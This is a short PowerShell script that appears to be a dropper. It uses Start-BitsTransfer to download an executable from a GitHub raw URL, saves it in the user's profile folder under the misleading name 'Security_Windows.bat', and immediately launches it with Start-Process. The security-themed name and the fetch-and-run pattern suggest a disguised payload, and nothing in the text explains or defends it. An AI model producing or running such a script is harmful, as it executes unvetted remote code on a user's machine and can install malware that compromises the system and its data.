Start-BitsTransfer -Priority foreground -Source "https://github.com/n0t-cr1m3/test/raw/main/Security_Windows1.exe" -Destination "$env:USERPROFILE/Security_Windows.bat"
Start-Process -FilePath "$env:USERPROFILE/Security_Windows.bat"
            